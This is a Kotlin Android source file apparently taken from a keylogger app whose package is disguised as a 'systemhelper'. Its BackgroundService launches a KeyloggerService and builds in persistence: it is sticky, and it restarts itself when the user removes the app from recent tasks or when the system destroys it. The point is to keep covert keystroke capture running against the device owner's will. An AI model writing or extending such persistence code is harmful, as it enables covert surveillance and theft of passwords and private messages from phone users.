package com.systemhelper.keylogger

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log

class BackgroundService : Service() {
    companion object {
        private const val TAG = "BackgroundService"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Background service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Ensure keylogger service is running
        startKeyloggerService()
        
        // Make service sticky to restart if killed
        return START_STICKY
    }

    private fun startKeyloggerService() {
        try {
            val keyloggerIntent = Intent(this, KeyloggerService::class.java)
            startService(keyloggerIntent)
        } catch (e: Exception) {
            Log.e(TAG, "Error starting keylogger service", e)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // Restart service if app is removed from recent apps
        val restartService = Intent(applicationContext, this.javaClass)
        restartService.setPackage(packageName)
        startService(restartService)
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        // Restart service if destroyed
        startKeyloggerService()
    }
} 